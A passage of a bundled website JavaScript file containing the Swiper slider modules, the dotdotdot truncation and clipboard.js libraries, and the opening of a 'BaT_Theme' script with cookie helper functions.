        });
      },
      on: {
        beforeInit: function () {
          this.params.lazy.enabled && this.params.preloadImages && (this.params.preloadImages = !1);
        },
        init: function () {
          this.params.lazy.enabled && !this.params.loop && 0 === this.params.initialSlide && this.lazy.load();
        },
        scroll: function () {
          this.params.freeMode && !this.params.freeModeSticky && this.lazy.load();
        },
        resize: function () {
          this.params.lazy.enabled && this.lazy.load();
        },
        scrollbarDragMove: function () {
          this.params.lazy.enabled && this.lazy.load();
        },
        transitionStart: function () {
          var e = this;
          e.params.lazy.enabled && (e.params.lazy.loadOnTransitionStart || !e.params.lazy.loadOnTransitionStart && !e.lazy.initialImageLoaded) && e.lazy.load();
        },
        transitionEnd: function () {
          this.params.lazy.enabled && !this.params.lazy.loadOnTransitionStart && this.lazy.load();
        }
      }
    }, {
      name: "controller",
      params: {
        controller: {
          control: void 0,
          inverse: !1,
          by: "slide"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          controller: {
            control: e.params.controller.control,
            getInterpolateFunction: V.getInterpolateFunction.bind(e),
            setTranslate: V.setTranslate.bind(e),
            setTransition: V.setTransition.bind(e)
          }
        });
      },
      on: {
        update: function () {
          this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
        },
        resize: function () {
          this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
        },
        observerUpdate: function () {
          this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
        },
        setTranslate: function (e, t) {
          this.controller.control && this.controller.setTranslate(e, t);
        },
        setTransition: function (e, t) {
          this.controller.control && this.controller.setTransition(e, t);
        }
      }
    }, {
      name: "a11y",
      params: {
        a11y: {
          enabled: !0,
          notificationClass: "swiper-notification",
          prevSlideMessage: "Previous slide",
          nextSlideMessage: "Next slide",
          firstSlideMessage: "This is the first slide",
          lastSlideMessage: "This is the last slide",
          paginationBulletMessage: "Go to slide {{index}}"
        }
      },
      create: function () {
        var t = this;
        ee.extend(t, {
          a11y: {
            liveRegion: L('<span class="' + t.params.a11y.notificationClass + '" aria-live="assertive" aria-atomic="true"></span>')
          }
        }), Object.keys(F).forEach(function (e) {
          t.a11y[e] = F[e].bind(t);
        });
      },
      on: {
        init: function () {
          this.params.a11y.enabled && (this.a11y.init(), this.a11y.updateNavigation());
        },
        toEdge: function () {
          this.params.a11y.enabled && this.a11y.updateNavigation();
        },
        fromEdge: function () {
          this.params.a11y.enabled && this.a11y.updateNavigation();
        },
        paginationUpdate: function () {
          this.params.a11y.enabled && this.a11y.updatePagination();
        },
        destroy: function () {
          this.params.a11y.enabled && this.a11y.destroy();
        }
      }
    }, {
      name: "history",
      params: {
        history: {
          enabled: !1,
          replaceState: !1,
          key: "slides"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          history: {
            init: R.init.bind(e),
            setHistory: R.setHistory.bind(e),
            setHistoryPopState: R.setHistoryPopState.bind(e),
            scrollToSlide: R.scrollToSlide.bind(e),
            destroy: R.destroy.bind(e)
          }
        });
      },
      on: {
        init: function () {
          this.params.history.enabled && this.history.init();
        },
        destroy: function () {
          this.params.history.enabled && this.history.destroy();
        },
        transitionEnd: function () {
          this.history.initialized && this.history.setHistory(this.params.history.key, this.activeIndex);
        }
      }
    }, {
      name: "hash-navigation",
      params: {
        hashNavigation: {
          enabled: !1,
          replaceState: !1,
          watchState: !1
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          hashNavigation: {
            initialized: !1,
            init: q.init.bind(e),
            destroy: q.destroy.bind(e),
            setHash: q.setHash.bind(e),
            onHashCange: q.onHashCange.bind(e)
          }
        });
      },
      on: {
        init: function () {
          this.params.hashNavigation.enabled && this.hashNavigation.init();
        },
        destroy: function () {
          this.params.hashNavigation.enabled && this.hashNavigation.destroy();
        },
        transitionEnd: function () {
          this.hashNavigation.initialized && this.hashNavigation.setHash();
        }
      }
    }, {
      name: "autoplay",
      params: {
        autoplay: {
          enabled: !1,
          delay: 3e3,
          waitForTransition: !0,
          disableOnInteraction: !0,
          stopOnLastSlide: !1,
          reverseDirection: !1
        }
      },
      create: function () {
        var t = this;
        ee.extend(t, {
          autoplay: {
            running: !1,
            paused: !1,
            run: W.run.bind(t),
            start: W.start.bind(t),
            stop: W.stop.bind(t),
            pause: W.pause.bind(t),
            onTransitionEnd: function (e) {
              t && !t.destroyed && t.$wrapperEl && e.target === this && (t.$wrapperEl[0].removeEventListener("transitionend", t.autoplay.onTransitionEnd), t.$wrapperEl[0].removeEventListener("webkitTransitionEnd", t.autoplay.onTransitionEnd), t.autoplay.paused = !1, t.autoplay.running ? t.autoplay.run() : t.autoplay.stop());
            }
          }
        });
      },
      on: {
        init: function () {
          this.params.autoplay.enabled && this.autoplay.start();
        },
        beforeTransitionStart: function (e, t) {
          this.autoplay.running && (t || !this.params.autoplay.disableOnInteraction ? this.autoplay.pause(e) : this.autoplay.stop());
        },
        sliderFirstMove: function () {
          this.autoplay.running && (this.params.autoplay.disableOnInteraction ? this.autoplay.stop() : this.autoplay.pause());
        },
        destroy: function () {
          this.autoplay.running && this.autoplay.stop();
        }
      }
    }, {
      name: "effect-fade",
      params: {
        fadeEffect: {
          crossFade: !1
        }
      },
      create: function () {
        ee.extend(this, {
          fadeEffect: {
            setTranslate: j.setTranslate.bind(this),
            setTransition: j.setTransition.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this;
          if ("fade" === e.params.effect) {
            e.classNames.push(e.params.containerModifierClass + "fade");
            var t = {
              slidesPerView: 1,
              slidesPerColumn: 1,
              slidesPerGroup: 1,
              watchSlidesProgress: !0,
              spaceBetween: 0,
              virtualTranslate: !0
            };
            ee.extend(e.params, t), ee.extend(e.originalParams, t);
          }
        },
        setTranslate: function () {
          "fade" === this.params.effect && this.fadeEffect.setTranslate();
        },
        setTransition: function (e) {
          "fade" === this.params.effect && this.fadeEffect.setTransition(e);
        }
      }
    }, {
      name: "effect-cube",
      params: {
        cubeEffect: {
          slideShadows: !0,
          shadow: !0,
          shadowOffset: 20,
          shadowScale: .94
        }
      },
      create: function () {
        ee.extend(this, {
          cubeEffect: {
            setTranslate: U.setTranslate.bind(this),
            setTransition: U.setTransition.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this;
          if ("cube" === e.params.effect) {
            e.classNames.push(e.params.containerModifierClass + "cube"), e.classNames.push(e.params.containerModifierClass + "3d");
            var t = {
              slidesPerView: 1,
              slidesPerColumn: 1,
              slidesPerGroup: 1,
              watchSlidesProgress: !0,
              resistanceRatio: 0,
              spaceBetween: 0,
              centeredSlides: !1,
              virtualTranslate: !0
            };
            ee.extend(e.params, t), ee.extend(e.originalParams, t);
          }
        },
        setTranslate: function () {
          "cube" === this.params.effect && this.cubeEffect.setTranslate();
        },
        setTransition: function (e) {
          "cube" === this.params.effect && this.cubeEffect.setTransition(e);
        }
      }
    }, {
      name: "effect-flip",
      params: {
        flipEffect: {
          slideShadows: !0,
          limitRotation: !0
        }
      },
      create: function () {
        ee.extend(this, {
          flipEffect: {
            setTranslate: K.setTranslate.bind(this),
            setTransition: K.setTransition.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this;
          if ("flip" === e.params.effect) {
            e.classNames.push(e.params.containerModifierClass + "flip"), e.classNames.push(e.params.containerModifierClass + "3d");
            var t = {
              slidesPerView: 1,
              slidesPerColumn: 1,
              slidesPerGroup: 1,
              watchSlidesProgress: !0,
              spaceBetween: 0,
              virtualTranslate: !0
            };
            ee.extend(e.params, t), ee.extend(e.originalParams, t);
          }
        },
        setTranslate: function () {
          "flip" === this.params.effect && this.flipEffect.setTranslate();
        },
        setTransition: function (e) {
          "flip" === this.params.effect && this.flipEffect.setTransition(e);
        }
      }
    }, {
      name: "effect-coverflow",
      params: {
        coverflowEffect: {
          rotate: 50,
          stretch: 0,
          depth: 100,
          modifier: 1,
          slideShadows: !0
        }
      },
      create: function () {
        ee.extend(this, {
          coverflowEffect: {
            setTranslate: _.setTranslate.bind(this),
            setTransition: _.setTransition.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this;
          "coverflow" === e.params.effect && (e.classNames.push(e.params.containerModifierClass + "coverflow"), e.classNames.push(e.params.containerModifierClass + "3d"), e.params.watchSlidesProgress = !0, e.originalParams.watchSlidesProgress = !0);
        },
        setTranslate: function () {
          "coverflow" === this.params.effect && this.coverflowEffect.setTranslate();
        },
        setTransition: function (e) {
          "coverflow" === this.params.effect && this.coverflowEffect.setTransition(e);
        }
      }
    }, {
      name: "thumbs",
      params: {
        thumbs: {
          swiper: null,
          slideThumbActiveClass: "swiper-slide-thumb-active",
          thumbsContainerClass: "swiper-container-thumbs"
        }
      },
      create: function () {
        ee.extend(this, {
          thumbs: {
            swiper: null,
            init: Z.init.bind(this),
            update: Z.update.bind(this),
            onThumbClick: Z.onThumbClick.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this.params.thumbs;
          e && e.swiper && (this.thumbs.init(), this.thumbs.update(!0));
        },
        slideChange: function () {
          this.thumbs.swiper && this.thumbs.update();
        },
        update: function () {
          this.thumbs.swiper && this.thumbs.update();
        },
        resize: function () {
          this.thumbs.swiper && this.thumbs.update();
        },
        observerUpdate: function () {
          this.thumbs.swiper && this.thumbs.update();
        },
        setTransition: function (e) {
          var t = this.thumbs.swiper;
          t && t.setTransition(e);
        },
        beforeDestroy: function () {
          var e = this.thumbs.swiper;
          e && this.thumbs.swiperCreated && e && e.destroy();
        }
      }
    }];
  return void 0 === T.use && (T.use = T.Class.use, T.installModule = T.Class.installModule), T.use(Q), T;
});
//# sourceMappingURL=swiper.min.js.map
;
/*!
 *	dotdotdot JS 4.0.9
 *
 *	dotdotdot.frebsite.nl
 *
 *	Copyright (c) Fred Heusschen
 *	www.frebsite.nl
 *
 *	License: CC-BY-NC-4.0
 *	http://creativecommons.org/licenses/by-nc/4.0/
 */
var Dotdotdot = function () {
  function t(e, i) {
    void 0 === i && (i = t.options);
    var n = this;
    for (var o in this.container = e, this.options = i || {}, this.watchTimeout = null, this.watchInterval = null, this.resizeEvent = null, t.options) t.options.hasOwnProperty(o) && void 0 === this.options[o] && (this.options[o] = t.options[o]);
    var r = this.container.dotdotdot;
    r && r.destroy(), this.API = {}, ["truncate", "restore", "destroy", "watch", "unwatch"].forEach(function (t) {
      n.API[t] = function () {
        return n[t].call(n);
      };
    }), this.container.dotdotdot = this.API, this.originalStyle = this.container.getAttribute("style") || "", this.originalContent = this._getOriginalContent(), this.ellipsis = document.createTextNode(this.options.ellipsis);
    var s = window.getComputedStyle(this.container);
    "break-word" !== s["word-wrap"] && (this.container.style["word-wrap"] = "break-word"), "pre" === s["white-space"] ? this.container.style["white-space"] = "pre-wrap" : "nowrap" === s["white-space"] && (this.container.style["white-space"] = "normal"), null === this.options.height && (this.options.height = this._getMaxHeight()), this.truncate(), this.options.watch && this.watch();
  }
  return t.prototype.restore = function () {
    var t = this;
    this.unwatch(), this.container.setAttribute("style", this.originalStyle), this.container.classList.remove("ddd-truncated"), this.container.innerHTML = "", this.originalContent.forEach(function (e) {
      t.container.append(e);
    });
  }, t.prototype.destroy = function () {
    this.restore(), this.container.dotdotdot = null;
  }, t.prototype.watch = function () {
    var t = this;
    this.unwatch();
    var e = {
        width: null,
        height: null
      },
      i = function (i, n, o) {
        if (t.container.offsetWidth || t.container.offsetHeight || t.container.getClientRects().length) {
          var r = {
            width: i[n],
            height: i[o]
          };
          return e.width == r.width && e.height == r.height || t.truncate(), r;
        }
        return e;
      };
    "window" == this.options.watch ? (this.resizeEvent = function (n) {
      t.watchTimeout && clearTimeout(t.watchTimeout), t.watchTimeout = setTimeout(function () {
        e = i(window, "innerWidth", "innerHeight");
      }, 100);
    }, window.addEventListener("resize", this.resizeEvent)) : this.watchInterval = setInterval(function () {
      e = i(t.container, "clientWidth", "clientHeight");
    }, 1e3);
  }, t.prototype.unwatch = function () {
    this.resizeEvent && (window.removeEventListener("resize", this.resizeEvent), this.resizeEvent = null), this.watchInterval && clearInterval(this.watchInterval), this.watchTimeout && clearTimeout(this.watchTimeout);
  }, t.prototype.truncate = function () {
    var t = this,
      e = !1;
    return this.container.innerHTML = "", this.originalContent.forEach(function (e) {
      t.container.append(e.cloneNode(!0));
    }), this.maxHeight = this._getMaxHeight(), this._fits() || (e = !0, this._truncateToNode(this.container)), this.container.classList[e ? "add" : "remove"]("ddd-truncated"), this.options.callback.call(this.container, e), e;
  }, t.prototype._truncateToNode = function (e) {
    var i = [],
      n = [];
    if (t.$.contents(e).forEach(function (t) {
      if (1 != t.nodeType || !t.matches(".ddd-keep")) {
        var e = document.createComment("");
        t.replaceWith(e), n.push(t), i.push(e);
      }
    }), n.length) {
      for (var o = 0; o < n.length; o++) {
        i[o].replaceWith(n[o]);
        var r = this.ellipsis.cloneNode(!0);
        switch (n[o].nodeType) {
          case 1:
            n[o].append(r);
            break;
          case 3:
            n[o].after(r);
        }
        var s = this._fits();
        if (r.parentElement.removeChild(r), !s) {
          if ("node" == this.options.truncate && o > 1) return void n[o - 2].remove();
          break;
        }
      }
      for (var a = o; a < i.length; a++) i[a].remove();
      var h = n[Math.max(0, Math.min(o, n.length - 1))];
      if (1 == h.nodeType) {
        var c = document.createElement(h.nodeName);
        c.append(this.ellipsis), h.replaceWith(c), this._fits() ? c.replaceWith(h) : (c.remove(), h = n[Math.max(0, o - 1)]);
      }
      1 == h.nodeType ? this._truncateToNode(h) : this._truncateToWord(h);
    }
  }, t.prototype._truncateToWord = function (t) {
    for (var e = t.textContent, i = -1 !== e.indexOf(" ") ? " " : "　", n = e.split(i), o = n.length; o >= 0; o--) if (t.textContent = this._addEllipsis(n.slice(0, o).join(i)), this._fits()) {
      "letter" == this.options.truncate && (t.textContent = n.slice(0, o + 1).join(i), this._truncateToLetter(t));
      break;
    }
  }, t.prototype._truncateToLetter = function (t) {
    for (var e = t.textContent.split(""), i = "", n = e.length; n >= 0 && (!(i = e.slice(0, n).join("")).length || (t.textContent = this._addEllipsis(i), !this._fits())); n--);
  }, t.prototype._fits = function () {
    return this.container.scrollHeight <= this.maxHeight + this.options.tolerance;
  }, t.prototype._addEllipsis = function (t) {
    for (var e = [" ", "　", ",", ";", ".", "!", "?"]; e.indexOf(t.slice(-1)) > -1;) t = t.slice(0, -1);
    return t += this.ellipsis.textContent;
  }, t.prototype._getOriginalContent = function () {
    var e = "script, style";
    this.options.keep && (e += ", " + this.options.keep), t.$.find(e, this.container).forEach(function (t) {
      t.classList.add("ddd-keep");
    }), [this.container].concat(t.$.find("*", this.container)).forEach(function (e) {
      e.normalize(), t.$.contents(e).forEach(function (t) {
        var i = !1;
        if (3 == t.nodeType) {
          if ("" == t.textContent.trim()) {
            var n = t.previousSibling,
              o = t.nextSibling;
            (t.parentElement.matches("table, thead, tbody, tfoot, tr, dl, ul, ol, video") || !n || n.matches("div, p, table, td, td, dt, dd, li") || !o || o.matches("div, p, table, td, td, dt, dd, li")) && (i = !0);
          }
        } else 8 == t.nodeType && (i = !0);
        i && e.removeChild(t);
      });
    });
    var i = [];
    return t.$.contents(this.container).forEach(function (t) {
      i.push(t.cloneNode(!0));
    }), i;
  }, t.prototype._getMaxHeight = function () {
    if ("number" == typeof this.options.height) return this.options.height;
    for (var t = window.getComputedStyle(this.container), e = ["maxHeight", "height"], i = 0, n = 0; n < e.length; n++) {
      if ("px" == (o = t[e[n]]).slice(-2)) {
        i = parseFloat(o);
        break;
      }
    }
    switch (e = [], t.boxSizing) {
      case "border-box":
        e.push("borderTopWidth"), e.push("borderBottomWidth");
      case "padding-box":
        e.push("paddingTop"), e.push("paddingBottom");
    }
    for (n = 0; n < e.length; n++) {
      var o;
      "px" == (o = t[e[n]]).slice(-2) && (i -= parseFloat(o));
    }
    return Math.max(i, 0);
  }, t.version = "4.0.9", t.options = {
    ellipsis: "… ",
    callback: function (t) {},
    truncate: "word",
    tolerance: 0,
    keep: null,
    watch: "window",
    height: null
  }, t.$ = {
    find: function (t, e) {
      return e = e || document, Array.prototype.slice.call(e.querySelectorAll(t));
    },
    contents: function (t) {
      return t = t || document, Array.prototype.slice.call(t.childNodes);
    }
  }, t;
}();
!function (t) {
  void 0 !== t && (t.fn.dotdotdot = function (t) {
    return this.each(function (e, i) {
      var n = new Dotdotdot(i, t);
      i.dotdotdot = n.API;
    });
  });
}(window.Zepto || window.jQuery);
;
/*!
 * clipboard.js v1.7.1
 * https://zenorocha.github.io/clipboard.js
 *
 * Licensed MIT © Zeno Rocha
 */
!function (t) {
  if ("object" == typeof exports && "undefined" != typeof module) module.exports = t();else if ("function" == typeof define && define.amd) define([], t);else {
    var e;
    e = "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this, e.Clipboard = t();
  }
}(function () {
  var t, e, n;
  return function t(e, n, o) {
    function i(a, c) {
      if (!n[a]) {
        if (!e[a]) {
          var l = "function" == typeof require && require;
          if (!c && l) return l(a, !0);
          if (r) return r(a, !0);
          var s = new Error("Cannot find module '" + a + "'");
          throw s.code = "MODULE_NOT_FOUND", s;
        }
        var u = n[a] = {
          exports: {}
        };
        e[a][0].call(u.exports, function (t) {
          var n = e[a][1][t];
          return i(n || t);
        }, u, u.exports, t, e, n, o);
      }
      return n[a].exports;
    }
    for (var r = "function" == typeof require && require, a = 0; a < o.length; a++) i(o[a]);
    return i;
  }({
    1: [function (t, e, n) {
      function o(t, e) {
        for (; t && t.nodeType !== i;) {
          if ("function" == typeof t.matches && t.matches(e)) return t;
          t = t.parentNode;
        }
      }
      var i = 9;
      if ("undefined" != typeof Element && !Element.prototype.matches) {
        var r = Element.prototype;
        r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector;
      }
      e.exports = o;
    }, {}],
    2: [function (t, e, n) {
      function o(t, e, n, o, r) {
        var a = i.apply(this, arguments);
        return t.addEventListener(n, a, r), {
          destroy: function () {
            t.removeEventListener(n, a, r);
          }
        };
      }
      function i(t, e, n, o) {
        return function (n) {
          n.delegateTarget = r(n.target, e), n.delegateTarget && o.call(t, n);
        };
      }
      var r = t("./closest");
      e.exports = o;
    }, {
      "./closest": 1
    }],
    3: [function (t, e, n) {
      n.node = function (t) {
        return void 0 !== t && t instanceof HTMLElement && 1 === t.nodeType;
      }, n.nodeList = function (t) {
        var e = Object.prototype.toString.call(t);
        return void 0 !== t && ("[object NodeList]" === e || "[object HTMLCollection]" === e) && "length" in t && (0 === t.length || n.node(t[0]));
      }, n.string = function (t) {
        return "string" == typeof t || t instanceof String;
      }, n.fn = function (t) {
        return "[object Function]" === Object.prototype.toString.call(t);
      };
    }, {}],
    4: [function (t, e, n) {
      function o(t, e, n) {
        if (!t && !e && !n) throw new Error("Missing required arguments");
        if (!c.string(e)) throw new TypeError("Second argument must be a String");
        if (!c.fn(n)) throw new TypeError("Third argument must be a Function");
        if (c.node(t)) return i(t, e, n);
        if (c.nodeList(t)) return r(t, e, n);
        if (c.string(t)) return a(t, e, n);
        throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList");
      }
      function i(t, e, n) {
        return t.addEventListener(e, n), {
          destroy: function () {
            t.removeEventListener(e, n);
          }
        };
      }
      function r(t, e, n) {
        return Array.prototype.forEach.call(t, function (t) {
          t.addEventListener(e, n);
        }), {
          destroy: function () {
            Array.prototype.forEach.call(t, function (t) {
              t.removeEventListener(e, n);
            });
          }
        };
      }
      function a(t, e, n) {
        return l(document.body, t, e, n);
      }
      var c = t("./is"),
        l = t("delegate");
      e.exports = o;
    }, {
      "./is": 3,
      delegate: 2
    }],
    5: [function (t, e, n) {
      function o(t) {
        var e;
        if ("SELECT" === t.nodeName) t.focus(), e = t.value;else if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) {
          var n = t.hasAttribute("readonly");
          n || t.setAttribute("readonly", ""), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute("readonly"), e = t.value;
        } else {
          t.hasAttribute("contenteditable") && t.focus();
          var o = window.getSelection(),
            i = document.createRange();
          i.selectNodeContents(t), o.removeAllRanges(), o.addRange(i), e = o.toString();
        }
        return e;
      }
      e.exports = o;
    }, {}],
    6: [function (t, e, n) {
      function o() {}
      o.prototype = {
        on: function (t, e, n) {
          var o = this.e || (this.e = {});
          return (o[t] || (o[t] = [])).push({
            fn: e,
            ctx: n
          }), this;
        },
        once: function (t, e, n) {
          function o() {
            i.off(t, o), e.apply(n, arguments);
          }
          var i = this;
          return o._ = e, this.on(t, o, n);
        },
        emit: function (t) {
          var e = [].slice.call(arguments, 1),
            n = ((this.e || (this.e = {}))[t] || []).slice(),
            o = 0,
            i = n.length;
          for (o; o < i; o++) n[o].fn.apply(n[o].ctx, e);
          return this;
        },
        off: function (t, e) {
          var n = this.e || (this.e = {}),
            o = n[t],
            i = [];
          if (o && e) for (var r = 0, a = o.length; r < a; r++) o[r].fn !== e && o[r].fn._ !== e && i.push(o[r]);
          return i.length ? n[t] = i : delete n[t], this;
        }
      }, e.exports = o;
    }, {}],
    7: [function (e, n, o) {
      !function (i, r) {
        if ("function" == typeof t && t.amd) t(["module", "select"], r);else if (void 0 !== o) r(n, e("select"));else {
          var a = {
            exports: {}
          };
          r(a, i.select), i.clipboardAction = a.exports;
        }
      }(this, function (t, e) {
        "use strict";

        function n(t) {
          return t && t.__esModule ? t : {
            default: t
          };
        }
        function o(t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }
        var i = n(e),
          r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
            return typeof t;
          } : function (t) {
            return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
          },
          a = function () {
            function t(t, e) {
              for (var n = 0; n < e.length; n++) {
                var o = e[n];
                o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, o.key, o);
              }
            }
            return function (e, n, o) {
              return n && t(e.prototype, n), o && t(e, o), e;
            };
          }(),
          c = function () {
            function t(e) {
              o(this, t), this.resolveOptions(e), this.initSelection();
            }
            return a(t, [{
              key: "resolveOptions",
              value: function t() {
                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                this.action = e.action, this.container = e.container, this.emitter = e.emitter, this.target = e.target, this.text = e.text, this.trigger = e.trigger, this.selectedText = "";
              }
            }, {
              key: "initSelection",
              value: function t() {
                this.text ? this.selectFake() : this.target && this.selectTarget();
              }
            }, {
              key: "selectFake",
              value: function t() {
                var e = this,
                  n = "rtl" == document.documentElement.getAttribute("dir");
                this.removeFake(), this.fakeHandlerCallback = function () {
                  return e.removeFake();
                }, this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement("textarea"), this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0", this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0", this.fakeElem.style.position = "absolute", this.fakeElem.style[n ? "right" : "left"] = "-9999px";
                var o = window.pageYOffset || document.documentElement.scrollTop;
                this.fakeElem.style.top = o + "px", this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, i.default)(this.fakeElem), this.copyText();
              }
            }, {
              key: "removeFake",
              value: function t() {
                this.fakeHandler && (this.container.removeEventListener("click", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem && (this.container.removeChild(this.fakeElem), this.fakeElem = null);
              }
            }, {
              key: "selectTarget",
              value: function t() {
                this.selectedText = (0, i.default)(this.target), this.copyText();
              }
            }, {
              key: "copyText",
              value: function t() {
                var e = void 0;
                try {
                  e = document.execCommand(this.action);
                } catch (t) {
                  e = !1;
                }
                this.handleResult(e);
              }
            }, {
              key: "handleResult",
              value: function t(e) {
                this.emitter.emit(e ? "success" : "error", {
                  action: this.action,
                  text: this.selectedText,
                  trigger: this.trigger,
                  clearSelection: this.clearSelection.bind(this)
                });
              }
            }, {
              key: "clearSelection",
              value: function t() {
                this.trigger && this.trigger.focus(), window.getSelection().removeAllRanges();
              }
            }, {
              key: "destroy",
              value: function t() {
                this.removeFake();
              }
            }, {
              key: "action",
              set: function t() {
                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "copy";
                if (this._action = e, "copy" !== this._action && "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"');
              },
              get: function t() {
                return this._action;
              }
            }, {
              key: "target",
              set: function t(e) {
                if (void 0 !== e) {
                  if (!e || "object" !== (void 0 === e ? "undefined" : r(e)) || 1 !== e.nodeType) throw new Error('Invalid "target" value, use a valid Element');
                  if ("copy" === this.action && e.hasAttribute("disabled")) throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
                  if ("cut" === this.action && (e.hasAttribute("readonly") || e.hasAttribute("disabled"))) throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
                  this._target = e;
                }
              },
              get: function t() {
                return this._target;
              }
            }]), t;
          }();
        t.exports = c;
      });
    }, {
      select: 5
    }],
    8: [function (e, n, o) {
      !function (i, r) {
        if ("function" == typeof t && t.amd) t(["module", "./clipboard-action", "tiny-emitter", "good-listener"], r);else if (void 0 !== o) r(n, e("./clipboard-action"), e("tiny-emitter"), e("good-listener"));else {
          var a = {
            exports: {}
          };
          r(a, i.clipboardAction, i.tinyEmitter, i.goodListener), i.clipboard = a.exports;
        }
      }(this, function (t, e, n, o) {
        "use strict";

        function i(t) {
          return t && t.__esModule ? t : {
            default: t
          };
        }
        function r(t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }
        function a(t, e) {
          if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return !e || "object" != typeof e && "function" != typeof e ? t : e;
        }
        function c(t, e) {
          if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e);
          t.prototype = Object.create(e && e.prototype, {
            constructor: {
              value: t,
              enumerable: !1,
              writable: !0,
              configurable: !0
            }
          }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e);
        }
        function l(t, e) {
          var n = "data-clipboard-" + t;
          if (e.hasAttribute(n)) return e.getAttribute(n);
        }
        var s = i(e),
          u = i(n),
          f = i(o),
          d = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
            return typeof t;
          } : function (t) {
            return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
          },
          h = function () {
            function t(t, e) {
              for (var n = 0; n < e.length; n++) {
                var o = e[n];
                o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, o.key, o);
              }
            }
            return function (e, n, o) {
              return n && t(e.prototype, n), o && t(e, o), e;
            };
          }(),
          p = function (t) {
            function e(t, n) {
              r(this, e);
              var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this));
              return o.resolveOptions(n), o.listenClick(t), o;
            }
            return c(e, t), h(e, [{
              key: "resolveOptions",
              value: function t() {
                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                this.action = "function" == typeof e.action ? e.action : this.defaultAction, this.target = "function" == typeof e.target ? e.target : this.defaultTarget, this.text = "function" == typeof e.text ? e.text : this.defaultText, this.container = "object" === d(e.container) ? e.container : document.body;
              }
            }, {
              key: "listenClick",
              value: function t(e) {
                var n = this;
                this.listener = (0, f.default)(e, "click", function (t) {
                  return n.onClick(t);
                });
              }
            }, {
              key: "onClick",
              value: function t(e) {
                var n = e.delegateTarget || e.currentTarget;
                this.clipboardAction && (this.clipboardAction = null), this.clipboardAction = new s.default({
                  action: this.action(n),
                  target: this.target(n),
                  text: this.text(n),
                  container: this.container,
                  trigger: n,
                  emitter: this
                });
              }
            }, {
              key: "defaultAction",
              value: function t(e) {
                return l("action", e);
              }
            }, {
              key: "defaultTarget",
              value: function t(e) {
                var n = l("target", e);
                if (n) return document.querySelector(n);
              }
            }, {
              key: "defaultText",
              value: function t(e) {
                return l("text", e);
              }
            }, {
              key: "destroy",
              value: function t() {
                this.listener.destroy(), this.clipboardAction && (this.clipboardAction.destroy(), this.clipboardAction = null);
              }
            }], [{
              key: "isSupported",
              value: function t() {
                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"],
                  n = "string" == typeof e ? [e] : e,
                  o = !!document.queryCommandSupported;
                return n.forEach(function (t) {
                  o = o && !!document.queryCommandSupported(t);
                }), o;
              }
            }]), e;
          }(u.default);
        t.exports = p;
      });
    }, {
      "./clipboard-action": 7,
      "good-listener": 4,
      "tiny-emitter": 6
    }]
  }, {}, [8])(8);
});
;
BaT_Theme.getCookie = function (cookieName) {
  var index = 0,
    parts = document.cookie.split(';'),
    value = '';
  for (index = 0; index < parts.length; index++) {
    value = parts[index].trim();
    if (value.indexOf(cookieName) == 0 && '=' === value.substr(cookieName.length, 1)) {
      // addition of 1 to account for equals sign
      return value.substr(cookieName.length + 1, value.length);
    }
  }
  return null;
};
BaT_Theme.setCookie = function (cookieName, cookieValue, expiresHours) {
  var date = new Date(),
    expires = '';
  if (expiresHours > 0) {
    date.setTime(date.getTime() + Math.ceil(expiresHours * 60 * 60 * 1000));
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = cookieName + "=" + cookieValue + expires + "; path=/";
};
var trackedEvents = ["click", "mousemove", "keypress"];
BaT_Theme.decodeHTML = function (html) {
  var html_entities = {
    '&amp;': '&',
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&apos;': "'",
    '&#039;': "'"
  };
